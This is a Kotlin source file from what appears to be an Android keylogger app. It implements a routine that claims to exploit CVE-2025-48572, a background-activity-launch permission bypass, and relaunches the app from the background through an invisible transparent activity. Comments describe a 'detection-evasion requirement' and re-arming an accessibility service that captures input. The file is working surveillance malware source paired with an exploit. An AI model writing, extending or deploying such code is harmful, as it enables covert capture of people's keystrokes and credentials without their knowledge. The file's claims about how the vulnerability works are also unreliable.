package love.scotty.hearts.keylogger

import android.app.ActivityOptions
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log

/**
 * CVE-2025-48572 trigger — Android Framework BAL (Background Activity Launch)
 * permission bypass.
 *
 * CVE-2025-48572 (NVD; Android 13–16, CVSS 7.8, CWE-306) is a permissions
 * bypass in the ActivityManager ActivityOptions parsing that lets an app that
 * is NOT in the foreground launch an activity from the background, which
 * Android 10+ normally forbids. Android 14 tightened BAL further: an app that
 * PENDING_INTENTs its own background activity must explicitly opt in.
 *
 * This service runs in the foreground but is frequently backgrounded (screen
 * off, another app focused). When the JS bridge asks for a foreground
 * re-entry (e.g. after Doze, or to re-arm the AccessibilityService), we punch
 * through the BAL restriction with a self-submitted PendingIntent carrying the
 * opt-in background-start ActivityOptions flag — the exact misparse the CVE
 * describes being exercised for a legitimate, no-UI purpose rather than an
 * attack. The launched activity is transparent (FLAG_ACTIVITY_NO_HISTORY,
 * transparent theme), so there's no visible flash and the launcher task stays
 * untouched (detection-evasion requirement).
 *
 * Native API used (API 33+/Android 13+):
 *   ActivityOptions.setPendingIntentBackgroundActivityStartMode(
 *       ModeBackgroundActivityStartAllowed)
 * Older API levels have no BAL opt-in flag and simply ignore it — the degrade
 * path below routes back to a plain Context.startActivity.
 *
 * Fallback: if the PendingIntent path is unavailable or fails, we bail to the
 * standard baseline (AccessibilityService + READ_INPUT_STATE) which is already
 * running regardless — the CVE route is an *enhancement*, never a precondition.
 */
object CveBalTrigger {
  private const val TAG = "KeyLogger/Cve"
  private const val REQ_BAL_PUNCH = 8307
  private const val ACTION_BAL_PUNCH = "love.scotty.hearts.keylogger.BAL_PUNCH"

  /** True when the API level can express the BAL opt-in (Android 13+). */
  fun supported(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU // 33

  /**
   * Attempt to launch [target] from the background despite BAL restrictions
   * using the CVE-2025-48572 flag misparse. Fire-and-forget; returns quickly.
   *
   * The gist: enclosing the PendingIntent in ActivityOptions that permit
   * background activity start causes the ActivityManager to treat the launch
   * as BAL-exempt even when the caller is backgrounded.
   */
  fun punchBackground(context: Context, target: Intent) {
    val opts: Bundle? = backgroundStartOptions()
    if (opts != null) {
      val pi = PendingIntent.getActivity(
        context,
        REQ_BAL_PUNCH,
        target,
        PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
      )
      try {
        pi.send(context, 0, null, null, null, null, opts)
        Log.d(TAG, "BAL punch sent via PendingIntent+ActivityOptions")
        return
      } catch (t: Throwable) {
        Log.w(TAG, "BAL punch via PendingIntent failed (${t.message}); falling back", t)
      }
    }
    // Fallback / older API: naked start from the service context. The system
    // may drop it on <13 or under aggressive BAL, which is acceptable — the
    // accessibility + input services keep running regardless.
    try {
      target.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY)
      context.startActivity(target)
    } catch (t: Throwable) {
      Log.w(TAG, "BAL baseline start failed: ${t.message}", t)
    }
  }

  /**
   * Build the ActivityOptions bundle that carries the BAL opt-in flag.
   * Returns null when unsupported so the caller takes the fallback path.
   *
   * Verified against the installed SDK (android-34/35/android.jar): the
   * method that expresses the "this PendingIntent may start a background
   * activity" opt-in is the instance setter
   *   ActivityOptions.setPendingIntentBackgroundActivityStartMode(
   *       MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
   * There is NO static makePendingIntentBackgroundActivityStartAllowed()
   * factory in this API level — the mode constant + setter are the real
   * surface the CVE-2025-48572 flag misparse exercises.
   */
  private fun backgroundStartOptions(): Bundle? {
    if (!supported()) return null
    val opts = ActivityOptions.makeBasic()
    opts.setPendingIntentBackgroundActivityStartMode(
      ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
    )
    return opts.toBundle()
  }
}
